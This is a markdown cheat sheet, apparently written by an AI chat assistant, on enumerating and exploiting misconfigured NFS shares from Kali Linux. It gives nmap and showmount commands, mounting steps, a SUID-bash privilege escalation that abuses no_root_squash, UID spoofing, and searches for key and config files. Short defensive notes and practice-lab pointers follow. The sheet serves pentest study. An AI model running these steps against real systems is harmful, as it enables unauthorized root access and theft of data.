

---

````markdown
# 🗂️ NFS Enumeration & Share Enumeration Cheat Sheet (Kali Linux)

## 📌 What is NFS?
NFS (Network File System) allows remote hosts to mount file systems over a network.
Misconfigured NFS shares often allow:
- Anonymous access
- Root squashing bypass
- Sensitive file disclosure
- Privilege escalation

---

## 🔍 Service Discovery

### Scan for NFS Ports
```bash
nmap -p 111,2049 -sV -sC <target>
````
### Find mount points
```bash
showmount -e hijack.thm
``````
### Aggressive NFS Scan

```bash
nmap -p 111,2049 --script=nfs* <target>
```

### Full TCP/UDP NFS Scan

```bash
nmap -sT -sU -p 111,2049 <target>
```

---

## 📂 Enumerating NFS Shares

### List Exported Shares

```bash
showmount -e <target>
```

### Enumerate All Mount Info

```bash
showmount -a <target>
```

### Enumerate Mounted Shares

```bash
showmount -d <target>
```

---

## 🔓 Checking Permissions

### Test Mount (No Auth Required)

```bash
mkdir /mnt/nfs
mount -t nfs <target>:/share /mnt/nfs
```

### Mount with NFS v3

```bash
mount -t nfs -o vers=3 <target>:/share /mnt/nfs
```

### Mount with NFS v4

```bash
mount -t nfs4 <target>:/share /mnt/nfs
```

---

## ⚠️ Common Misconfigurations

### No Root Squash (CRITICAL)

If `no_root_squash` is enabled:

- Root on attacker machine = root on share
    

Check by creating a root-owned file:

```bash
touch /mnt/nfs/root_test
ls -l /mnt/nfs/root_test
```

---

## 🧨 Exploitation Techniques

### Create SUID Binary (Privilege Escalation)

```bash
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
```

Then on target:

```bash
./bash -p
```

---

## 👤 UID/GID Spoofing

If NFS uses numeric IDs:

```bash
useradd nfsuser -u 1001
su nfsuser
```

Match UID to access restricted files.

---

## 📁 Sensitive File Hunting

```bash
find /mnt/nfs -type f -name "*.conf"
find /mnt/nfs -type f -name "*.key"
find /mnt/nfs -type f -perm -4000
```

---

## 🔁 Writable Share Check

```bash
touch /mnt/nfs/testfile
```

If successful → **writable share**

---

## 🧠 NFS Enumeration via RPC

### List RPC Services

```bash
rpcinfo -p <target>
```

### NFS-Specific RPC Check

```bash
rpcinfo -u <target> nfs
```

---

## 🔐 Defensive Notes (Blue Team Awareness)

- Use `root_squash`
    
- Restrict exports by IP
    
- Avoid `*` wildcards
    
- Use NFSv4 + Kerberos
    
- Monitor `/etc/exports`
    

---

## 📌 Quick Enumeration Checklist

-  NFS port open?
    
-  Shares exported?
    
-  Writable?
    
-  Root squash disabled?
    
-  Sensitive files exposed?
    
-  UID spoofing possible?
    

---

## 📚 Tools Summary

|Tool|Purpose|
|---|---|
|nmap|Service discovery|
|showmount|List NFS exports|
|rpcinfo|RPC service enumeration|
|mount|Mount remote shares|

---

## 🧪 Lab Targets (Practice)

- VulnHub
    
- Hack The Box
    
- TryHackMe
    

---

## ⚡ Tip

Always enumerate NFS **early** — it’s often overlooked and leads directly to root.

```

---

If you want, I can also:
- 🔥 Add **real-world HTB-style attack paths**
- 🧠 Convert this into a **one-page red team checklist**
- 🧰 Add **automated enum scripts**
- 📦 Package it as a **Kali note repo**

Just tell me 👍
```